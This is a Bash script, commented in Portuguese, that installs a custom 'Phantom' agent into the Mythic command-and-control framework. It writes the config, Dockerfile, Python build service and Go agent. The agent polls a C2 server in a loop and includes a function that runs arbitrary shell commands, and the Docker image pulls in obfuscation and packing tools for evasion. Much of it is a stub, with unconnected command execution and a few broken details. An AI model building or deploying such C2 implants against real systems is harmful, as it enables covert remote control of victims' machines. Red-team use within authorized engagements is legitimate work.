    #!/bin/bash

echo "[+] Script completo de instalação do Phantom no Mythic"

# Detectar diretório atual do Mythic
CURRENT_DIR=$(pwd)
MYTHIC_DIR=""

if [[ "$CURRENT_DIR" == *"Mythic"* ]]; then
    # Estamos dentro do diretório Mythic
    if [[ "$CURRENT_DIR" == *"/Payload_Types" ]]; then
        MYTHIC_DIR=$(dirname "$CURRENT_DIR")
    else
        MYTHIC_DIR="$CURRENT_DIR"
    fi
else
    echo "[-] Execute este script a partir do diretório Mythic"
    exit 1
fi

echo "[+] Diretório Mythic detectado: $MYTHIC_DIR"

# Verificar se o Phantom já existe
if [ -d "$MYTHIC_DIR/Payload_Types/Phantom" ]; then
    echo "[!] Phantom já existe. Removendo versão anterior..."
    sudo rm -rf "$MYTHIC_DIR/Payload_Types/Phantom"
fi

# Copiar arquivos do Phantom
echo "[+] Copiando arquivos do Phantom..."
sudo mkdir -p "$MYTHIC_DIR/Payload_Types/Phantom"
sudo mkdir -p "$MYTHIC_DIR/Payload_Types/Phantom/agent"
sudo mkdir -p "$MYTHIC_DIR/Payload_Types/Phantom/agent_functions"

# Criar estrutura básica
echo "[+] Criando estrutura de arquivos..."

# config.json
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/config.json" > /dev/null << 'EOF'
{
  "name": "Phantom",
  "description": "Advanced C2 agent with extensive evasion capabilities",
  "author": "@phantom",
  "version": "1.0",
  "mythic_version": "3.0.0",
  "supported_os": ["Windows", "Linux"],
  "wrapper": false,
  "wrapped_payloads": [],
  "c2_profiles": ["HTTP"],
  "build_language": "go",
  "agent_type": "agent",
  "translation_container": null,
  "mythic_encrypts": false,
  "supports_dynamic_loading": true
}
EOF

# Dockerfile
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/Dockerfile" > /dev/null << 'EOF'
FROM itsafeaturemythic/mythic_go_base:latest

WORKDIR /Mythic/

COPY [".", "."]

RUN apt-get update && \
    apt-get install -y upx-ucl && \
    go install mvdan.cc/garble@latest

CMD ["python3", "mythic_service.py"]
EOF

# requirements.txt
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/requirements.txt" > /dev/null << 'EOF'
mythic-container==0.2.15
EOF

# .env
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/.env" > /dev/null << 'EOF'
MYTHIC_CONTAINER_VERSION=0.2.15
EOF

# mythic_service.py simplificado
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/mythic_service.py" > /dev/null << 'EOF'
from mythic_container import *
import asyncio
import os
import subprocess

class Phantom(PayloadType):
    name = "phantom"
    file_extension = "exe"
    author = "@phantom"
    supported_os = [
        SupportedOS.Windows,
        SupportedOS.Linux,
    ]
    wrapper = False
    wrapped_payloads = []
    note = "Advanced C2 agent with extensive evasion capabilities"
    supports_dynamic_loading = True
    mythic_encrypts = False
    agent_type = "agent"
    
    build_parameters = [
        BuildParameter(
            name="server_url",
            parameter_type=BuildParameterType.String,
            description="C2 server URL",
            default_value="https://mythic-server.com",
        ),
        BuildParameter(
            name="sleep",
            parameter_type=BuildParameterType.Number,
            description="Sleep interval in seconds",
            default_value="5",
        ),
        BuildParameter(
            name="jitter",
            parameter_type=BuildParameterType.Number,
            description="Jitter percentage (0-100)",
            default_value="10",
        ),
    ]
    
    c2_profiles = ["HTTP"]

    async def build(self) -> BuildResponse:
        try:
            # Build básico do Go
            build_cmd = [
                "go", "build",
                "-ldflags", "-s -w",
                "-o", "phantom",
                "main.go"
            ]
            
            result = subprocess.run(build_cmd, capture_output=True, text=True, cwd="agent")
            
            if result.returncode == 0:
                return BuildResponse(
                    status=BuildStatus.Success,
                    payload=open("agent/phantom", "rb").read()
                )
            else:
                return BuildResponse(
                    status=BuildStatus.Error,
                    error_message=f"Build failed: {result.stderr}"
                )
                
        except Exception as e:
            return BuildResponse(
                status=BuildStatus.Error,
                error_message=str(e)
            )

async def main():
    await mythic_container.MythicContainer.start_and_run_forever()

if __name__ == "__main__":
    asyncio.run(main())
EOF

# Agent principal em Go
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/agent/main.go" > /dev/null << 'EOF'
package main

import (
    "fmt"
    "net/http"
    "time"
    "os"
    "os/exec"
    "runtime"
)

func main() {
    fmt.Println("[+] Phantom C2 Agent Starting...")
    
    // Configurações básicas
    serverURL := "http://localhost:5000"
    sleepInterval := 5 * time.Second
    
    if len(os.Args) > 1 {
        serverURL = os.Args[1]
    }
    
    fmt.Printf("[+] Connecting to: %s\n", serverURL)
    
    for {
        // Checkin básico
        resp, err := http.Get(serverURL + "/api/checkin")
        if err == nil {
            resp.Body.Close()
            fmt.Printf("[+] Checkin successful at %s\n", time.Now().Format("15:04:05"))
        } else {
            fmt.Printf("[-] Checkin failed: %v\n", err)
        }
        
        time.Sleep(sleepInterval)
    }
}

func executeCommand(command string) string {
    var cmd *exec.Cmd
    
    if runtime.GOOS == "windows" {
        cmd = exec.Command("cmd", "/C", command)
    } else {
        cmd = exec.Command("/bin/sh", "-c", command)
    }
    
    output, err := cmd.Output()
    if err != nil {
        return fmt.Sprintf("Error: %v", err)
    }
    
    return string(output)
}
EOF

# go.mod
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/agent/go.mod" > /dev/null << 'EOF'
module phantom

go 1.21

require ()
EOF

# Comando shell básico
sudo tee "$MYTHIC_DIR/Payload_Types/Phantom/agent_functions/shell.py" > /dev/null << 'EOF'
from mythic_container import *

class ShellArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="command",
                type=ParameterType.String,
                description="Command to execute",
                parameter_group_info=[ParameterGroupInfo(
                    required=True,
                    ui_position=1
                )]
            )
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must provide a command to execute")
        self.add_arg("command", self.command_line)

class ShellCommand(CommandBase):
    cmd = "shell"
    needs_admin = False
    help_cmd = "shell [command]"
    description = "Execute a shell command"
    version = 1
    author = "@phantom"
    argument_class = ShellArguments
    
    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            task_id=taskData.Task.ID,
            success=True,
        )
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(task_id=task.Task.ID, success=True)
        return resp
EOF

# Ajustar permissões
sudo chown -R root:root "$MYTHIC_DIR/Payload_Types/Phantom"
sudo chmod +x "$MYTHIC_DIR/Payload_Types/Phantom/agent/main.go"

echo "[+] Arquivos criados com sucesso!"

# Tentar instalar
echo "[+] Instalando Phantom no Mythic..."
cd "$MYTHIC_DIR"
sudo ./mythic-cli install folder Payload_Types/Phantom

if [ $? -eq 0 ]; then
    echo "[+] Phantom instalado com sucesso!"
    echo "[+] Para usar:"
    echo "    1. sudo ./mythic-cli start"
    echo "    2. Acesse https://localhost:7443"
    echo "    3. Crie novo payload 'Phantom'"
else
    echo "[-] Falha na instalação. Verificando logs..."
    sudo ./mythic-cli logs
fi
EOF